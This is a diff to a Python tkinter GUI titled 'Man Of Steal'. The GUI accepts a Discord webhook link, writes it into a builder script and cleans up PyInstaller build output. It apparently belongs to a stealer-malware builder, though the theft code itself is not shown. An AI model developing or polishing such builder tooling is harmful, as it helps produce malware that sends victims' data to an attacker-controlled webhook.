@@ -17,14 +17,14 @@ root = tk.Tk()
 root.attributes("-fullscreen", False)
 root.geometry("1000x600")
 root.config(bg=bg)
+root.resizable(False, False)
+root.title("Man Of Steal")
 
 def exit():
     root.destroy()
 
 def restore():
-    shutil.rmtree("../build")
-    shutil.rmtree("../dist")
-    os.remove("../builder.spec")
+    
 
     builder_file_path = "./builder.py"
 
@@ -40,12 +40,21 @@ def restore():
     content = re.sub(pattern, r'\1WEBHOOK_LINK"', content, flags=re.MULTILINE)
 
 
-
     
     with open(builder_file_path, "w") as file:
         file.write(content)
     
-    replace_first_line("../flags.txt", "0") 
+    replace_first_line("../flags.txt", "0")
+
+    font4=Font(family="Times New Roman", size=10, weight="bold")
+    restored_text = tk.Label(master=root, text="SETTINGS RESTORED !", font=font4, bg=bg, fg="red")
+    restored_text.place(x=750,y=470)
+
+    shutil.rmtree("../build")
+    shutil.rmtree("../dist")
+    os.remove("../builder.spec")
+
+    
 
 
 def replace_first_line(file_path, new_line):
@@ -63,7 +72,15 @@ def replace_first_line(file_path, new_line):
 
 def discord_click():
     webhook_link = discord_input.get()
-    update_builder_file(webhook_link)
+    if webhook_link:  # Vérifier si webhook_link n'est pas vide
+        update_builder_file(webhook_link)
+        font3 = Font(family="Times New Roman", size=15, weight="bold")
+        generated = tk.Label(master=root, text="DISCORD WEBHOOK SET!", font=font3, bg=bg, fg="green")
+        generated.place(x=100, y=500)
+    else:
+        messagebox.showerror("Error", "Please write your Discord WebHook link!")
+
+
 
 def update_builder_file(webhook_link):
     
@@ -165,4 +182,13 @@ restore = customtkinter.CTkButton(master=root, text="Restore Parameters", comman
 restore.pack(side=tk.BOTTOM, pady=20)
 
 
-root.mainloop()
+flags_file_path = "../flags.txt"
+
+with open(flags_file_path, "r") as file:
+    second_line = file.readlines()[1].strip()
+
+if second_line != "1":
+    messagebox.showerror("Error", "Requirements not installed. Please install the requirements before running the application!")
+
+else:
+    root.mainloop()
